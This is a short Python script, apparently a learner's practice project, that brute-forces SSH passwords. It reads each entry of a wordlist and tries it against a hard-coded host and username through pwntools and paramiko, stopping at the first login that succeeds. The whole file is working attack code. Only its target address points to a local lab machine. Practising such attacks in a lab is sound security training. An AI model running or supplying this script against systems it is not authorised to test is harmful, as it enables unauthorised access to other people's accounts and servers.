# Project 1- SSH Brute force using a wordlist
#Credentials are hard coded so not very wieldy

import paramiko.ssh_exception
from pwn import * #pwntools
import paramiko #for error handling

host = "127.0.0.1"
username = "notroot"
attempts = 0 #to clock how many attempts

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password=password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected(): #if password is valid and connection established
                print("[>] Valid password found: '{}'!".format(password))
                response.close() #close the connection
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts +=1